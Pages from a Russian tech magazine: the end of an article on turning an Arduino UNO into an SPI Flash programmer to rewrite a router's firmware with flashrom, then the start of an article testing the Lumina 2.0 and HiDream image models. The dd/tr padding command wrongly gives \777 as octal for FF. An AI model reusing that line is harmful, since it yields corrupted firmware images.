почему‑то не работает. Попробуй повторить запись. Надеюсь, ты преодо‐
леешь это затруднение.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
     ПРОГРАММАТОР
        ИЗ ARDUINO
        ПРОШИВАЕМ МАРШРУТИЗАТОР
           ПОДРУЧНЫМИ СРЕДСТВАМИ





ПОДКЛЮЧЕНИЕ МИКРОСХЕМЫ SPI FLASH

Чтобы запрограммировать микросхему, ее надо подключить к нашему UNO-
программатору. Причем сделать это следует правильно. Под «правильно»
имеются в виду два аспекта. Во‑первых, контакты чипа памяти должны быть
подключены к тем выводам программатора, которые использует его управля‐
ющая  программа.  Во‑вторых,  надо  обеспечить  соответствие  уровней
питания, сигналов микросхемы и программатора.


Схема коммутации
Первое требование выполнить довольно легко. Достаточно лишь проявить
внимательность и следовать схеме, изображенной на рисунке. Контакты 10–
13 зарезервированы для использования шиной SPI. Их обозначения различа‐
ются в разных спецификациях, но ты можешь ориентироваться на такое соот‐
ветствие между обозначениями Arduino, шиной SPI и микросхемой SPI Flash:
 • D10 — SS — SS — /CS — 1;
 • D11 — COPI — MOSI — DI — 5;
 • D12 — CIPO — MISO — DO — 2;
 • D13 — SCK — SCK — CLK — 6.





      Схема подключения микросхемы SPI Flash к UNO-программатору

Кроме того, микросхема SPI Flash должна быть включена в цепь питания,
для чего к ее восьмому контакту Vcc подключается вывод стабилизато‐
ра 3,3 В, а к 4-му контакту GND — общий провод.


           WARNING

                     На стороне UNO-программатора непосредствен‐
                      но под контактом 3,3 В находится контакт 5 В.
                      Будь  внимателен и не  подключи  микросхему
                          к повышенному напряжению!
                     Имей в виду, что встречаются микросхемы SPI
                            Flash,  которые  внешне ничем  не  отличаются
                         от нашего «пациента», но рассчитаны на нап‐
                      ряжение 1,8 В. Использовать их с нашим UNO-
                         программатором нельзя. Обязательно проверяй
                           маркировку  чипов  и  уточняй  их  параметры
                      по спецификациям производителя!


Тебя может удивить, что на рисунке линия питания подведена не только
к восьмому контакту микросхемы, но еще и к 3-му и 7-му. Контакт 3 (/WP —
Write Protect, защита от записи) предназначен для предотвращения модифи‐
кации информации в микросхеме памяти. Наклонная черта в его обозначении
говорит о том, что он управляется низким уровнем. То есть, когда на этот кон‐
такт подано низкое напряжение логического нуля, данные из микросхемы
можно только читать. Согласись, что такая защита не будет лишней для мик‐
росхемы BIOS на системной плате. Но в нашем случае ее надо отключить,
для чего на контакт подается высокий уровень напряжения, соответствующий
логической единице.
   Контакт 4 (/HOLD — удержание) позволяет приостанавливать работу мик‐
росхемы памяти на время, пока на него подан низкий уровень напряжения (о
чем нас опять информирует наклонная черта в обозначении). Поскольку
в наши планы никакие перерывы не входят, на него тоже подается высокий
уровень напряжения.


Согласование уровней сигналов
Что касается второго требования, то здесь придется поработать мозгами
и    паяльником.   Наличие    у   UNO-программатора    стабилизатора
питания 3,3 В не отменяет того факта, что сам он, получая питание от USB-
разъема, функционирует в 5-вольтовой логике. В соответствии с таблицей
в разделе 28.2 «DC Characteristics» («Характеристики постоянного тока») спе‐
цификации на микроконтроллер ATmega328P, выходное напряжение на лини‐
ях данных может составлять от 4,1 до 5 В. Это значит, что логическая единица
по линиям данных, изображенным на приведенной схеме пунктирными лини‐
ями, будет передаваться уровнем напряжения около 5 В, на что микросхема
памяти не рассчитана.


           WARNING

                   В разделе 9 «Electrical characteristics» («Электри‐
                           ческие  характеристики»)  спецификации  чипа
                    W25Q128FV написано, что напряжение питания
                       Vcc может достигать 4,6 В, а напряжение на сиг‐
                          нальных линиях Vio допускается до Vcc + 0,4 В.
                   В нашем случае Vcc = 3,3 В, и тогда абсолютный
                        максимум  для  сигналов   составляет  3,7  В,
                      но никак не 5 В.
                    В  интернете  можно  встретить  сообщения
                      об успешной работе с SPI Flash на повышенном
                         напряжении, но производитель английским язы‐
                     ком  предупреждает,  что  это может  привести
                          к  поломке  изделия.  Если  ты  несколько  раз
                      успешно  перебежал дорогу на  красный  свет,
                        это не значит, что светофоры теперь можно уби‐
                          рать.


В школе на уроках физики нам рассказывали, что понизить напряжение мож‐
но с помощью делителя на двух резисторах — такого, как на рисунке.





                    Делитель напряжения на резисторах

Если сопротивление выхода программатора мало по сравнению с R1, а соп‐
ротивление входа микросхемы памяти велико по сравнению с R2, то нап‐
ряжение на выходе делителя можно рассчитать по формуле
  Uвых = Uвх * R2 / (R1 + R2).
  Из разделов «Electrical characteristics» («Электрические характеристики»)
спецификаций на микроконтроллер ATmega328P, являющийся центральным
элементом UNO-программатора, и микросхему W25Q128FV мы можем узнать
возможные значения напряжения низкого (логический 0) Vol и высокого
(логическая 1) Voh уровней на выходах микроконтроллера, а также допус‐
тимые значения напряжения низкого Vil и высокого Vih уровней на входах мик‐
росхемы памяти:
 • Vol — от 0 до 0,8 В;
 • Voh — от 4,1 В до Vcc;
 •  Vil — от –0,5 В до 0,3Vcc;
 • Vih — от 0,6Vcc до Vсс + 0,5.

С учетом того что напряжение питания Vcc микроконтроллера составляет 5 В,
а микросхемы памяти — 3,3 В, получаем картину, показанную на рисунке.





  Возможное напряжение на выходах UNO-программатора (слева)
  и допустимое напряжение на входах микросхемы памяти (справа)

Как видишь, напряжение низкого уровня попадает в допустимый диапазон,
чего нельзя сказать о напряжении высокого уровня.


        WWW

                         Рекомендации по  согласованию  уровней  нап‐
                      ряжения UNO-программатора и микросхем SPI
                          Flash ты можешь  найти на  сайте программы
                          flashrom.


Коэффициент резистивного делителя K = R2 / (R1 + R2) надо выбрать таким,
чтобы в допустимый диапазон попадали как верхняя граница возможного
напряжения выходов микроконтроллера, так и нижняя. Посчитаем максималь‐
ное и минимальное значения коэффициента:
 • Kмакс = 3,70 : 5,00 = 0,74,
 • Kмин = 2,31 : 4,10 = 0,56.

Теперь можно подбирать резисторы. На сайте программы flashrom в качестве
примера предлагается использовать R1 = 10 кОм и R2 = 15 кОм. Коэффици‐
ент такого делителя равен 15/25 = 0,6. Действительно, он удовлетворяет рас‐
считанным требованиям.


             INFO

                      У тебя может возникнуть вопрос: почему вмес‐
                         то 10 кОм и 15 кОм нельзя взять резисторы
                        номиналом, к примеру, в тысячу раз меньше?
                      Ведь коэффициент построенного на них делителя
                        будет таким же?
                     А потому,  что общее  сопротивление  такого
                          делителя составит всего 25 Ом. При появлении
                       на   выходе   микроконтроллера   напряжения
                          высокого уровня 5 В через делитель на общий
                            проводник по закону Ома  I = U/R потечет ток
                      силой 5 В / 25 Ом = 200 мА, что значительно пре‐
                         вышает   нагрузочную   способность  выходной
                        линии, составляющую 20 мА. Если высокий уро‐
                       вень будет держаться достаточно  долго, UNO-
                          программатор может выйти из строя.
                           Хорошо,   а   если   номиналы   резисторов
                      не уменьшить, а увеличить в тысячу раз? Ну,
                          во‑первых, тогда уже нельзя будет пренебречь
                         влиянием   сопротивления   входа  микросхемы
                       на параметры делителя, а во‑вторых, резистор
                    R1 величиной 10 МОм ограничит ток до величи‐
                    ны 5 В / 10 МОм = 0,5 мкА, чего может оказаться
                           недостаточно для того, чтобы микросхема обна‐
                          ружила сигнал на входе. Сопротивление такой
                         величины  уже  можно  рассматривать  просто
                         как обрыв соединения.



Реальное воплощение
Резисторов номиналом 15 кОм у меня не оказалось, зато было в дос‐
татке 10 кОм и 5,1 кОм. Если R1 = 5,1 кОм, а R2 = 10 кОм, то коэффициент
делителя равен 100/151 = 0,66. Это тоже допустимый показатель, поэтому
на таком варианте я и остановился. Для удобства использования я собрал
на макетной плате схему, показанную на рисунке.





  Три резистивных делителя для преобразования выходов UNO-прог‐
  рамматора во входы SPI Flash


           WARNING

                    Во избежание повреждения UNO-программатора
                      и микросхем SPI Flash коммутацию проводников
                         выполняй только на отключенном от USB-питания
                          программаторе. А перед включением вниматель‐
                      но осмотри собранную конструкцию на предмет
                             правильности выполненных соединений и отсутс‐
                        твия контактов между проводниками там, где их
                      быть не должно. Наибольшую опасность пред‐
                           ставляет короткое замыкание линии питания VCC
                      и общего провода GND.


Сначала я попробовал подпаяться к ножкам микросхемы SPI Flash прямо
на плате маршрутизатора, и технически мне это удалось. Но UNO-прог‐
рамматор упрямо сообщал, что никакой микросхемы он не видит:



  No EEPROM/flash device found.


Возможно, для такого  варианта  подключения не  хватило  поступающей
из USB-порта мощности питания. Раз внутриплатное программирование про‐
валилось, то было решено снять микросхему с платы.


           WARNING

                            Контактные площадки, к которым припаяна мик‐
                         росхема  SPI  Flash,  довольно  чувствительны
                          к механическим нагрузкам, поэтому, снимая мик‐
                          росхему обычным паяльником, ты очень рискуешь
                        их повредить. Если у тебя нет соответствующего
                           опыта   и    инструмента,   лучше   обратиться
                       для выполнения этой операции к специалистам
                            мастерской.


Поскольку я планировал поэкспериментировать с устройством, то, во избе‐
жание постоянных воздействий на плату, присоединил к освободившимся
контактным площадкам панельку DIP8 с помощью восьми гибких проводов
длиной около 5 см, изготовленных из ненужного шлейфа для флоппи‑дис‐
ковода. А микросхему SPI Flash установил на плату‑переходник SOP8 — DIP8,
в отверстия которой впаял контактные гребенки, оставив длинные концы их
штекеров свободными. Получился «картридж», который можно многократно
подключать к плате маршрутизатора и отсоединять от нее.
   Дабы не лишать себя удобства при программировании, я собрал для это‐
го картриджа специальную плату, позволяющую таким же простым образом
подключать его к UNO-программатору. На рисунке не указаны соединитель‐
ные проводники линий данных, чтобы не загромождать его. Просто соедини
перемычкой каждый цветной круглый пятак с квадратом вывода панельки
DIP8 такого же цвета.





                Плата подключения SPI Flash к программатору

Чтобы не ошибиться при переподключениях, я маркировал угол микросхемы
возле контакта № 1 и угол панельки с соответствующим разъемом на плате
белой краской с помощью текстового корректора.


           WARNING

                    Не забудь, что электролитический конденсатор
                      емкостью  около 1 мкФ, включенный в линию
                        питания, требует соблюдения полярности под‐
                          ключения.



ПРОВЕРКА ГОТОВНОСТИ

Для проверки работы всей системы в сборе надо:
 • правильно установить картридж с микросхемой W25Q128FVSG на плату
   SPI Flash;
 • правильно соединить UNO-программатор с платой SPI Flash гибкими про‐
   водниками;
 • подключить UNO-программатор к управляющему компьютеру кабелем
  USB и ввести команду


flashrom -p serprog:dev=/dev/ttyUSB0:115200

Если все было сделано правильно, ты увидишь такой ответ программатора:



  flashrom v0.9.9-rc1-r1942 on Linux 4.4.262
  ...
  Calibrating delay loop... OK.
  serprog: Programmer name is "frser-duino"
  serprog: requested mapping AT45CS1282 is incompatible: 0x1080000 bytes
  at 0xfef80000
  Found Winbond flash chip "W25Q128.V" (16384 kB, SPI) on serprog.
  No operations were specified.


Сообщение «Programmer name is "frser-duino"» говорит о том, что утилита
flashrom смогла установить  контакт с UNO-программатором через USB,
а сообщение «Found Winbond flash chip "W25Q128.V"» информирует, что UNO-
программатор установил контакт с микросхемой SPI Flash через набор про‐
водников и определил ее модель. Если микросхема не определилась, то
отсоедини UNO-программатор от компьютера и проверь правильность его
соединения с платой SPI Flash. Ты можешь увидеть другие сообщения, нап‐
ример



  Found Generic flash chip "unknown SPI chip RDID" (0 kb, SPI) on serprog.


или



  Found unknown flash chip "SFDP-capatible chip" (16384 kB, SPI)
  on serprog.


Скорее всего, это говорит о плохом контакте в соединениях между UNO-
программатором и платой SPI Flash. Попробуй зачистить концы проводников,
при необходимости немного изогни их так, чтобы они плотно держались
в разъемах. Используй для сигнальных линий провода длиной не боль‐
ше 10 см.
   Когда добьешься успеха, прочитай два раза содержимое SPI Flash и срав‐
ни полученные файлы dump1.bak и dump2.bak:


flashrom -p serprog:dev=/dev/ttyUSB0:115200 -c "W25Q128.V" -r dump1.
bak
flashrom -p serprog:dev=/dev/ttyUSB0:115200 -c "W25Q128.V" -r dump2.
bak
cmp dump1.bak dump2.bak && echo "No differences found."

Обрати внимание, что в параметре -c надо указать модель микросхемы
памяти, из которой производится чтение. Процесс считывания одного дампа
занимает около 24 мин. Все это время на UNO-программаторе постоянно
горят светодиоды on и rx, а светодиод tx подмигивает с интервалом око‐
ло 2 с.


             INFO

                          Узким местом нашей  установки  является пос‐
                          ледовательный  интерфейс,  работающий  через
                         USB-подключение между управляющим компь‐
                        ютером и UNO-программатором: из‑за исполь‐
                       зования  в  последнем  недорогой  микросхемы
                   CH340G надежный информационный обмен воз‐
                     можен    на     скоростях,    не    превыша‐
                   ющих 115 200 бит/с. Скорость передачи данных
                         между UNO-программатором и микросхемой SPI
                          Flash гораздо выше.


Если вместо фразы «No differences found» ты увидел сообщение о различиях
в прочитанных файлах, то придется заняться поиском их причины. Скорее
всего, это плохие контакты или слишком длинные соединительные провода.
   Если же расхождений не обнаружено, можешь приниматься за прог‐
раммирование SPI Flash. Но на этом пути есть еще одна важная остановка.


ПОДГОТОВКА ФАЙЛА FIRMWARE

Файл  firmware —  это  образ  содержимого  микросхемы  памяти.  Если
это содержимое считывается в файл, то никаких сложностей не возникает.
Но при записи может оказаться так, что имеющийся образ меньше, чем
емкость памяти микросхемы. В нашем случае микросхема способна хра‐
нить  16  Мбайт,  а  найденный  файл  был  прочитан  из  микросхемы
емкостью 8 Мбайт. UNO-программатор в такой ситуации отказывается про‐
являть сообразительность и «опускает руки» — в ответ на команду записи
дампа из файла zte_h118n.bin


flashrom -p serprog:dev=/dev/ttyUSB0:115200 -c "W25Q128.V" -w zte_
h118n.bin

программа сообщает:



  Error: Image size (8388608 B) doesn't match the flash chip's size
  (16777216 B)


Поэтому нам самим придется подогнать файл под емкость памяти. Проще
всего дописать в него недостающие байты FF в количестве 8 Мбайт сле‐
дующей командой:


dd if=/dev/zero bs=8388608 count= 1 | tr '\0' '\777' >> zte_h118n.bin

Здесь утилита dd извлекает из неисчерпаемого источника нулей /dev/zero
нужное количество значений, которые утилита tr превращает в FF (\777 —
это запись шестнадцатеричного числа FF в восьмеричной системе счис‐
ления), после чего они конструкцией командной оболочки >> дописываются
в файл образа.
   Когда емкость новой микросхемы памяти кратна емкости старой, часто
советуют использовать образ, состоящий из нужного количества дубликатов
исходной прошивки. Для рассматриваемого случая такой образ zte_h118n.
new нетрудно подготовить с помощью команды


cat zte_h118n.bin zte_h118n.bin > zte_h118n.new


ПРОГРАММИРОВАНИЕ

Ты уже  соединил выводы  UNO-программатора с  платой  Flash-памяти,
на которой установлен «картридж» с микросхемой W25Q128FVSG, и у тебя
есть образ firmware нужного размера в файле zte_h118n.bin? Тогда подклю‐
чай USB-кабель к управляющему компьютеру и вводи команду


flashrom -p serprog:dev=/dev/ttyUSB0:115200 -c "W25Q128.V" -w zte_
h118n.bin

В ходе процесса, который длится примерно полтора часа, выполняются сле‐
дующие операции:
 • считывание старого содержимого памяти;
 • стирание  памяти  и  запись  в  нее  нового  содержимого  из  файла
  zte_h118n.bin ;
 • проверка результата записи.

На экране ты увидишь такие сообщения:



  Found Winbond flash chip "W25Q128.V" (16384 kB, SPI) on serprog.
  Reading old flash chip contents... done.
  Erasing and writing flash chip... Erase/write done.
  Verifying flash... VERIFIED.


После записи я, не теряя времени, установил микросхему памяти в маршру‐
тизатор и включил его... Увы! Меня постигло полное разочарование. Сколько
я ни ждал, индикаторы на его панели так и не загорелись.


ЗАКЛЮЧЕНИЕ

Несмотря на то что записанный в микросхему памяти образ оригинальной
прошивки отказался работать на моем оборудовании, давай посмотрим
на проделанный путь и решим, действительно ли все было напрасно.
   Ну, во‑первых, мы превратили клон Arduino UNO в полезное устройство —
UNO-программатор. Во‑вторых, мы выполнили расчеты делителя напряжения
на резисторах и собрали плату‑адаптер для безопасной работы с микросхе‐
мами SPI Flash, рассчитанными на напряжение питания 3,3 В. В‑третьих, мы
научились готовить образ данных требуемого размера для записи в мик‐
росхемы SPI Flash. И наконец, в‑четвертых, мы использовали UNO-прог‐
рамматор для чтения и записи микросхемы памяти. Так что теперь у нас есть
гораздо больше знаний, навыков и возможностей, чем было в начале пути.





  UNO-программатор с платой‑адаптером для программирования SPI
  Flash

Помимо всего прочего, микросхемы SPI Flash сами по себе занятные шту‐
ковины. В спецификациях заявлено, что они выдерживают 100 тысяч циклов
перезаписи, а записанные в них данные могут храниться там до двадцати лет.
Конечно, емкость этих микросхем уступает современным флешкам, а во вре‐
мя записи с помощью UNO-программатора можно даже немного вздремнуть.
Зато их необычный форм‑фактор и нестандартный способ подключения
надежно защитят ценные для тебя сведения от посторонних глаз. Ведь вмес‐
то образа firmware ничто не мешает записать в микросхему какой‑нибудь ZIP-
архив.
  И тем не менее, встает вопрос о том, куда двигаться дальше. По исходно‐
му имени найденного файла с оригинальным дампом можно предположить,
что его  извлекли из микросхемы Macronix MX25L6406E. Спецификация
говорит о том, что ее электрические и геометрические параметры совмести‐
мы с уже хорошо знакомой нам микросхемой Winbond 25Q128FVSG, только
емкость памяти в два раза меньше. Тогда почему бы не попробовать
записать в нее образ прошивки, вдруг тогда маршрутизатор «оживет»?
   Так и сделаем! Но это уже совсем другая история...
GEEK





В последние месяцы новые модели генера‐
тивных ИИ стали появляться с завидной
регулярностью.     Большинство     таких
моделей — проприетарные, как, например,
новый   генератор   картинок   ChatGPT;           Олег Афонин                                                                                      Эксперт по мобильной
некоторые можно скачать, но для их работы       криминалистике компании                                                                                         «Элкомсофт»
нужны   профессиональные   видеокарты        aoleg@voicecallcentral.com
с 80 Гбайт видеопамяти. Я же хочу расска‐
зать о двух новых моделях, которые можно
запустить на обычном компьютере с обыч‐
ной видеокартой.


LUMINA 2.0

Эта модель использует полноценный LLM Gemma-2-2B и архитектуру VAE
от Flux. Число параметров модели — 2,6 миллиарда, что, с одной стороны,
немного (в SDXL столько же), а с другой — позволяет запускать ее на слабом
железе. Для сравнения: у Flux — 12 миллиардов параметров, и запускать ее
на локальном железе уже затруднительно. SD3.5 Large обладает 8 миллиар‐
дами параметров (и работает достаточно быстро), а число параметров
у SD3.5 Medium — тоже 2,6 миллиарда, что делает ее самой легковесной
из современных моделей (впрочем, с ее качеством это особо не помогает).
У HiDream — 17 миллиардов параметров.


УСТАНОВКА И ИСПОЛЬЗОВАНИЕ МОДЕЛИ

Для работы с Lumina 2.0 мы будем использовать SwarmUI, уже знакомый тебе
по статье «Фишки Flux.1. Добиваемся лучших картинок от новой генеративной
модели». Не буду повторяться, тем более что с тех пор интерфейс SwarmUI
практически не изменился.
   Скачать модель можно с civit.ai.





Скачанный файл с расширением .safetensors нужно положить в папку
SwarmUI\Models\Stable-Diffusion, после чего обновить список моделей.
Загрузить модель можно, нажав на три точки справа от ее иконки и выбрав
Load Now.





Модель чувствительна к выбору CFG, семплера и шедулера. Мои настройки
показаны на скриншоте.





                    CFG = 3, Euler, Beta

Модель поддерживает разрешения до 2К (то есть можно генерировать кар‐
тинки размером порядка 1440 на 1440, включая другие стандартные вари‐
анты соотношения сторон).
   Помимо  Euler, поддерживаются и некоторые другие семплеры; здесь
открыто поле для экспериментов. Так, хорошо работает (и выдает более кон‐
трастные и детализированные изображения) семплер DPM++ 2M.





В общем‑то, больше настраивать нечего. Модель легковесная, негативные
ключевые слова поддерживает, но есть нюанс: управление ведется через
полноценный LLM Gemma-2-2B, и принцип построения запросов к нему под‐
чиняется правилам работы с LLM, а не с более простыми текстовыми декоде‐
рами. Разработчики рекомендуют начинать запрос приблизительно сле‐
дующим образом:

      You  are  an  assistant  designed  to  generate  superior  images  with
       the superior degree of image-text alignment based on textual prompts«
       or user prompts. <Prompt Start>                »
Не стоит воспринимать этот запрос буквально. Модель прекрасно понимает
запросы вроде «You are an artist drawing illustrations for a children’s book»,
которые можно гибко менять в зависимости от задачи (это работает, можно
экспериментировать).
  От слов — к делу. Посмотрим, на что способна модель.


LUMINA 2.0: РЕЗУЛЬТАТЫ ТЕСТИРОВАНИЯ

Поскольку модель использует LLM, я буду приводить запросы целиком. Боль‐
шую часть из них я составлял вручную, но некоторые я попросил сгенери‐
ровать ChatGPT.
   Начнем с простого: китайской акварели. Так работает модель с CFG = 7.





      you are a Chinese painter. mixing oil paint and watercolor, draw a painting
       of a tranquil Chinese village, with white houses overlooking a river channel,«
      and a boat floating along the river                »
А так — с CFG = 3.





А тут CFG = 3, но разрешение — 1440 на 1440.





Симпатично. Добавим котенка, и рисунок пусть будет на старом холсте.





      you are a Chinese painter. mixing oil paint and watercolor, draw a painting
       of of a  little  girl wearing  traditional Chinese hanfu dress, playing with«
      a kitten. In background, there  is a tranquil Chinese  village, with white
      houses overlooking a river channel, and a boat floating along the river.
      canvas is old traditional media                »
Проблемы с лицом, небольшие проблемы с руками. Котят два.
   Попробуем готическую даму.





      you are a modern artist. create hyperrealistic art of a Victorian-era gothic
     woman standing elegantly, wearing a wide-brimmed black hat and a long«
       flowing Victorian dress with intricate lace details and a tight corset, pale
        skin, all-black clothing, dark and mysterious atmosphere, her expression
      calm yet haunting, standing in front of a dimly  lit Victorian mansion, high
       contrast between her pale skin and dark attire, cinematic, medium shot,
       detailed  face  and  fabric,  side  view,  gothic  elegance,  eerie mood,
       outdoors, dark, night, fantasy, masterpiece, best quality                »
То же самое, но маслом.





На картинку маслом похоже не очень. Обрати внимание на низкую детали‐
зацию лица.





Это можно исправить сегментированием. Напомню, синтаксис такой:


<segment:face:0.3,0.5>текстовый запрос, описывающий сегмент





                                      Результат

Сегментирование работает, огрехи исправляются.
   Попробуем гламур.





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
  LUMINA 2 И HIDREAM
        ТЕСТИРУЕМ НОВЫЕ МОДЕЛИ ДЛЯ
        СОЗДАНИЯ КАРТИНОК НА СВОЕМ
                      КОМПЬЮТЕРЕ




Сразу видна проблема с пальцами. Исправить ее сегментированием не уда‐
лось; относительно беспроблемный вариант, у которого сегментированием
вышло исправить пальцы рук, получился только с третьей попытки.





Попробуем черно‑белое стрит‑фото.





Хороший контраст и композиция, лицо при желании можно исправить сег‐
ментированием.
   Теперь стилизация — Модильяни и Ван Гог.





Где‑то в промежутке от «совсем не похоже» до «сойдет».
   Теперь попробуем сгенерировать фотографию женщины‑пилота (в этой
и следующих картинках семплер — DPM++ 2M):





И чуть менее гламурно.





Попробуем в документальном стиле.





Отмечу, что детализация не дотягивает до уровня SDXL из статьи «Запретный
SDXL. Нарушаем правила и расширяем границы возможного при генерации
картинок».
  А что у нас с текстом? Попробуем многократно описанный постер.





      you are a Pixar  artist creating a cover for a new movie in Pixar style.
      Render the following cover. Title: Display the  title "The Crazy Adventure«
       of the Kung-Fu Chicken" in bold and playful text at the top or center
       of the poster.
      Main Character: Depict a dynamic and charismatic ninja chicken  in a
       heroic karate pose, wearing a traditional karate outfit, while  still showing
       chicken features like feathers and a beak.
      Background: Include a colorful and exciting backdrop with elements like
      a mystical forest, a bustling city, and an ancient temple to hint at various
       adventures. The background is vibrant and engaging.
       Supporting Characters: Add a few quirky and fun supporting characters
      such as a wise old turtle, a mischievous squirrel sidekick, and a villainous
        fox.
       Pixar Branding: Incorporate the Pixar logo at the bottom or top of the
       poster to establish it as an official Pixar movie.
       Tagline: Include a tagline that reads: "A Kung-Fu Adventure" prominently
      on the poster.
        Visual  Style: Ensure the  overall  visual  style  is  consistent  with  Pixar’s
       signature animation look: bright colors, expressive characters, and a touch
       of whimsy.                »
Сравни с результатом работы Flux.





Комментарии излишни.
   Попробуем сделать картинку попроще, но тоже с текстом.





И снова результат отрицательный. Я сгенерировал больше десятка изоб‐
ражений, и ни разу текст не был пропечатан без ошибок. Возможно, сущес‐
твуют какие‑то комбинации параметров, при которых модель начнет лучше
генерировать текст, но мне их найти не удалось.
   Зато вот такую обложку модель сгенерировала вполне прилично по дос‐
таточно сложному запросу.





      you are an artist drawing a book cover. the cover depicts a proud knight
        in the foreground, wearing a full closed helmet, ornate engraved armor,«
       holding a triangular shield with a heraldic lion emblem, bold stance.
      behind him stands a dark elf woman, a drow warrior, white flowing hair,
      sharp predatory face,  light leather armor, holding a bow, two curved
      swords on her back,
      on the side, another human fighter in simple armor, carrying a spear and a
      round shield, alert and ready.
          all characters in heroic pose, standing together like a battle party.
      background shows ruined stone, broken columns, desolate wasteland, soft
         light and dust in the air,
       fantasy adventure, medieval warriors, epic team, detailed faces and armor,
        rich  textures,  dynamic  composition,  high  fantasy,  cinematic  lighting,
         illustration  style, cover  art,  ultra detailed, 4k, concept  art, dark tones,
       character focus                »
Добавлю, что ни одной модели SDXL этот запрос (как и его вариации) оказал‐
ся не под  силу.  Корректно  справились с ним лишь ChatGPT, Lumina
2.0 и HiDream.


HIDREAM: ТРИ ТЕКСТОВЫХ ДЕКОДЕРА И LLM В ПРИДАЧУ

Изначально я собирался писать только о Lumina 2.0, но несколько дней назад
появилась еще одна новая архитектура. «Очередная проходная модель», —
подумал я, и оказался неправ: картинки, создаваемые энтузиастами, получа‐
ются даже более приличными, чем те, что в свое время создавались Flux.
   Модель HiDream-I1 (доступно онлайн‑демо) произвела эффект, подобный
тому, который мы наблюдали в момент релиза Flux. Модель демонстрирует
не только исключительную точность следования запросам, но и поддержку
разнообразных стилей. Качество изображений, насколько его можно оценить
по доступным источникам, не уступает Flux и на голову превосходит Stable
Diffusion 3.5.
   Разработчики HiDream решили раз и навсегда закрыть вопрос с распозна‐
ванием текстовых запросов, использовав не один или два, а сразу четыре
декодера. В новой модели  применяются декодеры OpenCLIP  ViT-bigG,
OpenAI CLIP ViT-L и T5-XXL от Google, а кроме того — еще и языковая модель
Llama-3.1-8B-Instruct от Meta.
   Декодеры CLIP-G и CLIP-L (как в SDXL) позволяют быстро декодировать
короткие фразы и ключевые слова, перечисляемые через запятую; T5-XXL
(как у Flux и Stable Diffusion 3.5) улучшает распознавание связного текста.
Вишенкой на торте стало использование большой языковой модели Llama-
3.1-8B-Instruct, которая по уровню понимания текста значительно лучше, чем
T5-XXL.
   Кстати, VAE здесь использован от Flux.1 Schnell, и это на сегодняшний
день лучший VAE из имеющихся.


             INFO

                     VAE — это модель, отвечающая за перевод дан‐
                      ных из латентного пространства в пространство
                          пикселей и обратно; от ее качества напрямую
                        зависит качество картинки.





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
  LUMINA 2 И HIDREAM
        ТЕСТИРУЕМ НОВЫЕ МОДЕЛИ ДЛЯ
        СОЗДАНИЯ КАРТИНОК НА СВОЕМ
                      КОМПЬЮТЕРЕ





ТРИ ВЕРСИИ И ЛИЦЕНЗИЯ MIT LICENSE

Так же как и в свое время Flux, HiDream-I1 доступна в трех версиях: Full, Dev
и Fast, однако на этом сходство с Flux заканчивается.
  Все три модели Flux распространяются с разными лицензиями. Полная
версия Flux.1 Pro доступна исключительно для генерации в режиме онлайн;
Flux.1 Dev распространяется в виде дистиллированной модели с достаточно
жесткой лицензией, которая ограничивает коммерческое использование.
Наконец, Flux.1 Schnell (аналог версии Fast) также доступна в дистиллирован‐
ном виде, но лицензия здесь уже Apache 2.0.
   Что касается HiDream, то все три модели распространяются с максималь‐
но открытой лицензией MIT, которая не запрещает ничего и разрешает все,
включая коммерческие применения. Сообщество разработчиков радостно
потирает руки в ожидании выхода инструментов для обучения модели.
   Версия Full — действительно полная, и только в ней поддерживаются
негативные ключевые  слова. Для  генерации изображения модель  тре‐
бует 50 шагов. Работает так же, как и все другие модели, поддерживает
параметр CFG.
   Из‑за необходимости обсчитывать cond и uncond каждый шаг занимает
вдвое больше времени; дистиллированные версии, соответственно, вдвое
быстрее при том же числе шагов, но и самих шагов требуют меньше.
   Использовать «полную» модель, вероятно, есть смысл лишь тогда, когда
без негативного промпта не обойтись; качество картинки у дистиллированных
моделей не хуже, а временами и лучше. Это в целом аналог Flux.pro (которая
доступна только онлайн).
   Версия Dev — дистиллированная; она работает вдвое быстрее полной,
при этом требует 28 шагов; не поддерживает негативные ключевые слова.
Качество картинки не уступает полной версии. Рекомендую начать изучение
именно с этой версии. Аналог Flux.dev.
   Версия Fast еще немного ускоряет генерацию по сравнению с Dev,
но падение качества становится заметным. Стоит использовать только в слу‐
чаях, когда время генерации критично. Изображения создаются за 16 шагов.
Аналог Flux Schnell.


HIDREAM: ВАРИАНТЫ КВАНТОВАНИЯ

Предварительная поддержка модели уже появилась в интерфейсе Comfy и,
как следствие, в SwarmUI. В Comfy замечательный механизм управления
памятью, позволяющий запускать даже самые тяжелые модели на видеокар‐
тах с 6–8 Гбайт видеопамяти, а новая модель — исключительно тяжелая;
по умолчанию в  видеопамять  загружается и  текстовый декодер Llama
(используется его квантованная до fp8 версия, если ничего не менять),
и весовые коэффициенты генератора изображений.
   Если тебе не терпится протестировать новую модель, то о полной версии
bf16/fp16 можно забыть: для их использования нужно намного больше виде‐
опамяти, чем доступно даже в самых мощных современных видеокартах.
   Впрочем, разработчики практически моментально переняли опыт поль‐
зователей Flux и выпустили сразу несколько десятков квантованных версий.
На видеокартах с 12–16 Гбайт видеопамяти можно попробовать запустить
версии fp8, Q6, Q5 или Q4 (у каждой из которых, в свою очередь, тоже нес‐
колько разновидностей). Я попробовал варианты hidream_i1_dev с кван‐
тованием fp8, Q6_K и Q4_K_M. Первые две модели работали, но полностью
в 16 Гбайт видеопамяти не поместились.
    Результат:
 • hidream_i1_dev_fp8.safetensors: 2 мин, 92,83 с, 46,95 с, 59,55 с;
 • hidream-i1-dev-Q6_K.gguf: 84,89 с, 85 с, 66,95 с;
 • hidream-i1-dev-Q4_K_M.gguf: 53,48 с, 44,22 с, 66,05 с, 52,64 с, 51,06 с.

Версия fp8 самая требовательная к видеопамяти, но и самая скоростная:
в режиме fp8 могут напрямую работать многие современные видеокарты;
скорость генерации может сильно отличаться в зависимости от того, хватило
ли модели видеопамяти, или оболочке пришлось выгружать ее по частям.
   Dev-Q6_K скромнее и почти помещается в 16 Гбайт видеопамяти, но и
механизм квантования здесь более сложный — видеокарте постоянно при‐
ходится тратить время на распаковку.
   Вариант Q4_K_M работает наиболее стабильно; с ним утилизация виде‐
опамяти не превышала 14 Гбайт.
   Есть и другие варианты с еще более сильным сжатием, но падение качес‐
тва в них уже становится заметным на глаз.
   Выбрав модель, можно приступать к экспериментам.


